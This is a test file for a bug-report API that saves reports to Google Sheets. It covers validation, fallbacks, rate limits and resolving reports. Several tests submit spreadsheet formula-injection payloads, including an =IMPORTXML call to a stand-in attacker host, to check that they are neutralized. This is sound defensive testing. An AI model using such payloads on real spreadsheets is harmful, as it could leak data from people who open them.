/**
 * Integration coverage for POST /api/bug-reports through the real app +
 * MSW-mocked Google APIs, complementing the direct unit tests in
 * bugReportService.test.ts. This route is deliberately NOT gated by
 * requireAuth (see bugReportRoutes.ts's own comment) - a report about a
 * broken/expired session must still save - so the "no session" case
 * below is a real, in-scope path, not just an auth-guard smoke test.
 */
import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";
import request from "supertest";
import fs from "fs/promises";
import path from "path";
import { http, HttpResponse } from "msw";
import { app } from "../app";
import { server } from "./setup";
import { resetHandlersState, appendCallCount, lastAppendedRow } from "./handlers";
import { authCookieHeader } from "./helpers/session";
import { _resetBugReportRateLimitForTesting } from "../routes/bugReportRoutes";

const mockTokens = {
  access_token: "bug-report-mock-token",
  refresh_token: "bug-report-mock-refresh",
  expiry_date: Date.now() + 3600000,
};
const authHeader = authCookieHeader(mockTokens);

const BUG_REPORTS_DIR = path.join(process.cwd(), "bug-reports");

const validBody = {
  title: "Checkout button does nothing",
  description: "Clicked twice, no response.",
  type: "Bug",
  timestamp: "2026-09-03T14:32:07.142Z",
  route: "/BidManagement (workflow: bids, tab: checkout)",
  appState: "Bidders: 42",
  browserInfo: "User-Agent: test-agent",
  consoleActivity: [{ level: "error", message: "boom", timestamp: "2026-09-03T14:32:00.000Z" }],
  screenshotBase64: null,
};

async function listBugReportFiles(): Promise<string[]> {
  try {
    return await fs.readdir(BUG_REPORTS_DIR);
  } catch {
    return [];
  }
}

describe("POST /api/bug-reports", () => {
  beforeEach(() => {
    resetHandlersState();
    _resetBugReportRateLimitForTesting();
  });

  afterEach(async () => {
    const files = await listBugReportFiles();
    await Promise.all(files.map((f) => fs.rm(path.join(BUG_REPORTS_DIR, f), { force: true })));
  });

  it("400s when title, description, or type is missing", async () => {
    const res = await request(app).post("/api/bug-reports").send({ title: "Only a title" });
    expect(res.status).toBe(400);
    expect(res.body.error).toContain("required");
  });

  it("saves to the configured Bug-Reports spreadsheet when authenticated and a spreadsheet ID is provided", async () => {
    const res = await request(app)
      .post("/api/bug-reports")
      .set(authHeader)
      .send({ ...validBody, bugReportsSpreadsheetId: "sheet-abc" });

    expect(res.status).toBe(200);
    expect(res.body).toMatchObject({ success: true, storage: "sheet" });
    expect(appendCallCount).toBe(1);
    expect(lastAppendedRow).toEqual([
      expect.any(String), // Report ID
      "2026-09-03T14:32:07.142Z",
      "Open",
      "Bug",
      "Checkout button does nothing",
      "Clicked twice, no response.",
      "/BidManagement (workflow: bids, tab: checkout)",
      "Bidders: 42",
      "User-Agent: test-agent",
      expect.stringContaining("boom"),
      "", // no screenshot folder configured -> no link
    ]);

    // The resilient local fallback must not have been used on the happy path.
    expect(await listBugReportFiles()).toHaveLength(0);
  });

  it("neutralizes spreadsheet formula injection in free-text fields before writing to the sheet - this endpoint is unauthenticated, so an attacker's =IMPORTXML(...)/=HYPERLINK(...) payload would otherwise execute for whichever staff member later opens the Bug-Reports sheet", async () => {
    const res = await request(app)
      .post("/api/bug-reports")
      .set(authHeader)
      .send({
        ...validBody,
        title: '=IMPORTXML("https://attacker.example/x","//x")',
        description: "+1 formula too",
        route: "-also a formula",
        appState: "@mentions trigger formulas in Sheets too",
        bugReportsSpreadsheetId: "sheet-abc",
      });

    expect(res.status).toBe(200);
    expect(lastAppendedRow[4]).toBe("'=IMPORTXML(\"https://attacker.example/x\",\"//x\")");
    expect(lastAppendedRow[5]).toBe("'+1 formula too");
    expect(lastAppendedRow[6]).toBe("'-also a formula");
    expect(lastAppendedRow[7]).toBe("'@mentions trigger formulas in Sheets too");
  });

  it("falls back to a local .md file when no Bug Reports spreadsheet is configured", async () => {
    const res = await request(app)
      .post("/api/bug-reports")
      .set(authHeader)
      .send(validBody); // no bugReportsSpreadsheetId

    expect(res.status).toBe(200);
    expect(res.body).toMatchObject({ success: true, storage: "local" });
    expect(appendCallCount).toBe(0);

    const files = await listBugReportFiles();
    expect(files).toHaveLength(1);
    expect(files[0]).toMatch(/\.md$/);
    const content = await fs.readFile(path.join(BUG_REPORTS_DIR, files[0]), "utf-8");
    expect(content).toContain("Checkout button does nothing");
  });

  it("falls back to a local .md file when there is no authenticated session at all (e.g. an expired OAuth session)", async () => {
    const res = await request(app)
      .post("/api/bug-reports")
      // no session cookie at all
      .send({ ...validBody, bugReportsSpreadsheetId: "sheet-abc" });

    expect(res.status).toBe(200);
    expect(res.body).toMatchObject({ success: true, storage: "local" });
    expect(appendCallCount).toBe(0);
    expect(await listBugReportFiles()).toHaveLength(1);
  });

  it("400s on a type outside the three the dialog offers", async () => {
    const res = await request(app).post("/api/bug-reports").set(authHeader).send({ ...validBody, type: "=HYPERLINK(\"x\")" });
    expect(res.status).toBe(400);
    expect(res.body.error).toContain("type must be one of");
  });

  it("writes the timestamp and Report ID columns as validated values, never as sent - they skipped the formula guard (ROADMAP.md M1)", async () => {
    const res = await request(app)
      .post("/api/bug-reports")
      .set(authHeader)
      .send({ ...validBody, timestamp: '=IMPORTXML("https://attacker.example/x","//x")', bugReportsSpreadsheetId: "sheet-abc" });

    expect(res.status).toBe(200);
    expect(lastAppendedRow[1]).toMatch(/^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\.\d{3}Z$/);
    expect(lastAppendedRow[0]).toMatch(/^\d{4}-\d{2}-\d{2}T[\w-]+$/);
  });

  it("caps each free-text field so one request can't write megabytes of text", async () => {
    const res = await request(app).post("/api/bug-reports").set(authHeader).send({ ...validBody, description: "x".repeat(200_000), bugReportsSpreadsheetId: "sheet-abc" });
    expect(res.status).toBe(200);
    expect(lastAppendedRow[5]).toHaveLength(50_000);
  });

  it("rate-limits reports without a session per address, so an anonymous script can't flood the logs or disk", async () => {
    for (let i = 0; i < 5; i++) {
      const ok = await request(app).post("/api/bug-reports").send(validBody);
      expect(ok.status).toBe(200);
    }
    const limited = await request(app).post("/api/bug-reports").send(validBody);
    expect(limited.status).toBe(429);

    // A signed-in user is not limited.
    const signedIn = await request(app).post("/api/bug-reports").set(authHeader).send(validBody);
    expect(signedIn.status).toBe(200);
  });

  it("drops the screenshot from a report without a session", async () => {
    const res = await request(app).post("/api/bug-reports").send({ ...validBody, screenshotBase64: "aGVsbG8=" });
    expect(res.status).toBe(200);
    const files = await listBugReportFiles();
    expect(files.filter((f) => f.endsWith(".png"))).toHaveLength(0);
    expect(files.filter((f) => f.endsWith(".md"))).toHaveLength(1);
  });

  it("in production, falls back to one structured Cloud Logging entry instead of Cloud Run's in-memory disk", async () => {
    const previous = process.env.NODE_ENV;
    process.env.NODE_ENV = "production";
    const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});
    try {
      const res = await request(app).post("/api/bug-reports").set(authHeader).send({ ...validBody, screenshotBase64: "aGVsbG8=" });
      expect(res.status).toBe(200);
      expect(res.body).toMatchObject({ success: true, storage: "log" });
      expect(await listBugReportFiles()).toHaveLength(0);

      const entry = errorSpy.mock.calls.map((c) => c[0]).find((c) => typeof c === "string" && c.includes('"bugReport"'));
      const parsed = JSON.parse(entry as string);
      expect(parsed.severity).toBe("ERROR");
      expect(parsed.bugReport.title).toBe("Checkout button does nothing");
      expect(parsed.bugReport.screenshotOmitted).toBe(true);
      expect(parsed.bugReport).not.toHaveProperty("screenshotBase64");
    } finally {
      process.env.NODE_ENV = previous;
      errorSpy.mockRestore();
    }
  });

  it("accepts a realistic base64 screenshot payload - the default express.json() 100kb limit used to reject this with a 413, hit for real by an actual submitted bug report", async () => {
    // ~390KB base64 string, matching the real payload size from the
    // user-reported 413 (expected: 399592 bytes, limit: 102400).
    const screenshotBase64 = "a".repeat(390_000);

    const res = await request(app)
      .post("/api/bug-reports")
      .set(authHeader)
      .send({ ...validBody, screenshotBase64 }); // no spreadsheet -> local fallback, simplest path to assert success

    expect(res.status).toBe(200);
    expect(res.body).toMatchObject({ success: true, storage: "local" });
  });

  it("still rejects a genuinely oversized payload (well past the raised 5mb limit) with a real 413, not a silent hang or a misleading 500", async () => {
    const screenshotBase64 = "a".repeat(6 * 1024 * 1024);

    const res = await request(app)
      .post("/api/bug-reports")
      .set(authHeader)
      .send({ ...validBody, screenshotBase64 });

    expect(res.status).toBe(413);
  });
});

describe("GET /api/bug-reports/list", () => {
  beforeEach(() => {
    resetHandlersState();
  });

  it("401s with no authenticated session - unlike POST /, viewing reports is a real admin action gated like every other data route", async () => {
    const res = await request(app).get("/api/bug-reports/list").query({ spreadsheetId: "sheet-abc" });
    expect(res.status).toBe(401);
  });

  it("400s when spreadsheetId is missing", async () => {
    const res = await request(app).get("/api/bug-reports/list").set(authHeader);
    expect(res.status).toBe(400);
  });

  it("returns only Open reports, dropping the header row and any already-resolved rows", async () => {
    server.use(
      http.get("https://sheets.googleapis.com/v4/spreadsheets/:spreadsheetId/values/:range", () => {
        return HttpResponse.json({
          values: [
            ["Report ID", "Timestamp", "Status", "Type", "Title", "Description", "Route", "App State", "Browser Info", "Recent Console Activity", "Screenshot Link"],
            ["report-1", "2026-09-04T00:00:00.000Z", "Open", "Bug", "Open bug", "desc 1", "/route1", "state1", "browser1", "console1", "https://drive.google.com/file/d/abc/view"],
            ["report-2", "2026-09-04T00:01:00.000Z", "Fixed", "UI Issue", "Already fixed bug", "desc 2", "/route2", "state2", "browser2", "console2", ""],
            ["report-3", "2026-09-04T00:02:00.000Z", "open", "Workflow Issue", "Lowercase-status open bug", "desc 3", "/route3", "state3", "browser3", "console3", ""],
          ],
        });
      })
    );

    const res = await request(app)
      .get("/api/bug-reports/list")
      .set(authHeader)
      .query({ spreadsheetId: "sheet-abc" });

    expect(res.status).toBe(200);
    expect(res.body.reports).toHaveLength(2);
    expect(res.body.reports.map((r: any) => r.reportId)).toEqual(["report-1", "report-3"]);
    expect(res.body.reports[0]).toMatchObject({
      title: "Open bug",
      type: "Bug",
      route: "/route1",
      screenshotLink: "https://drive.google.com/file/d/abc/view",
    });
  });
});

describe("POST /api/bug-reports/resolve", () => {
  beforeEach(() => {
    resetHandlersState();
  });

  it("401s with no authenticated session", async () => {
    const res = await request(app).post("/api/bug-reports/resolve").send({ spreadsheetId: "sheet-abc", reportId: "report-1" });
    expect(res.status).toBe(401);
  });

  it("400s when spreadsheetId or reportId is missing", async () => {
    const res = await request(app).post("/api/bug-reports/resolve").set(authHeader).send({ spreadsheetId: "sheet-abc" });
    expect(res.status).toBe(400);
  });

  it("404s when the report ID isn't found in the sheet", async () => {
    server.use(
      http.get("https://sheets.googleapis.com/v4/spreadsheets/:spreadsheetId/values/:range", () => {
        return HttpResponse.json({ values: [["Report ID"], ["some-other-report"]] });
      })
    );

    const res = await request(app)
      .post("/api/bug-reports/resolve")
      .set(authHeader)
      .send({ spreadsheetId: "sheet-abc", reportId: "does-not-exist" });

    expect(res.status).toBe(404);
  });

  it("writes 'Fixed' to column C of the matched row", async () => {
    server.use(
      http.get("https://sheets.googleapis.com/v4/spreadsheets/:spreadsheetId/values/:range", () => {
        return HttpResponse.json({
          values: [
            ["Report ID", "Timestamp", "Status"],
            ["report-1", "2026-09-04T00:00:00.000Z", "Open"],
            ["report-2", "2026-09-04T00:01:00.000Z", "Open"],
          ],
        });
      })
    );

    let updateRange = "";
    let updateValues: any[][] = [];
    server.use(
      http.put("https://sheets.googleapis.com/v4/spreadsheets/:spreadsheetId/values/:range", async ({ request, params }) => {
        updateRange = decodeURIComponent(String(params.range));
        const body = (await request.json()) as any;
        updateValues = body.values;
        return HttpResponse.json({ updatedRows: 1 });
      })
    );

    const res = await request(app)
      .post("/api/bug-reports/resolve")
      .set(authHeader)
      .send({ spreadsheetId: "sheet-abc", reportId: "report-2" });

    expect(res.status).toBe(200);
    expect(res.body).toEqual({ success: true });
    expect(updateRange).toBe("Bug-Reports!C3"); // header row 1 + report-1 row 2 -> report-2 is row 3
    expect(updateValues).toEqual([["Fixed"]]);
  });

  it("also deletes the report's screenshot from Drive when the row has one, so resolved reports don't leave orphaned images behind", async () => {
    server.use(
      http.get("https://sheets.googleapis.com/v4/spreadsheets/:spreadsheetId/values/:range", () => {
        return HttpResponse.json({
          values: [
            ["Report ID", "Timestamp", "Status", "Type", "Title", "Description", "Route", "App State", "Browser Info", "Console Activity", "Screenshot Link"],
            ["report-1", "t", "Open", "Bug", "Title", "Desc", "/route", "state", "browser", "console", "https://drive.google.com/file/d/screenshot-file-id/view"],
          ],
        });
      }),
      http.put("https://sheets.googleapis.com/v4/spreadsheets/:spreadsheetId/values/:range", () => {
        return HttpResponse.json({ updatedRows: 1 });
      })
    );

    let deletedFileId = "";
    let deletedSupportsAllDrives: string | null = null;
    server.use(
      http.delete("https://www.googleapis.com/drive/v3/files/:fileId", ({ params, request: req }) => {
        deletedFileId = String(params.fileId);
        deletedSupportsAllDrives = new URL(req.url).searchParams.get("supportsAllDrives");
        return new HttpResponse(null, { status: 204 });
      })
    );

    const res = await request(app)
      .post("/api/bug-reports/resolve")
      .set(authHeader)
      .send({ spreadsheetId: "sheet-abc", reportId: "report-1" });

    expect(res.status).toBe(200);
    expect(deletedFileId).toBe("screenshot-file-id");
    // The Bug Screenshots folder lives in a Shared Drive - Drive rejects
    // a delete against a Shared Drive file that omits this, the exact
    // real bug that silently left every resolved report's screenshot
    // behind (swallowed by the route's own best-effort try/catch).
    expect(deletedSupportsAllDrives).toBe("true");
  });

  it("does not attempt a Drive delete when the resolved report never had a screenshot", async () => {
    server.use(
      http.get("https://sheets.googleapis.com/v4/spreadsheets/:spreadsheetId/values/:range", () => {
        return HttpResponse.json({
          values: [["Report ID", "Timestamp", "Status"], ["report-1", "t", "Open"]],
        });
      }),
      http.put("https://sheets.googleapis.com/v4/spreadsheets/:spreadsheetId/values/:range", () => {
        return HttpResponse.json({ updatedRows: 1 });
      })
    );

    let deleteCalled = false;
    server.use(
      http.delete("https://www.googleapis.com/drive/v3/files/:fileId", () => {
        deleteCalled = true;
        return new HttpResponse(null, { status: 204 });
      })
    );

    const res = await request(app)
      .post("/api/bug-reports/resolve")
      .set(authHeader)
      .send({ spreadsheetId: "sheet-abc", reportId: "report-1" });

    expect(res.status).toBe(200);
    expect(deleteCalled).toBe(false);
  });
});
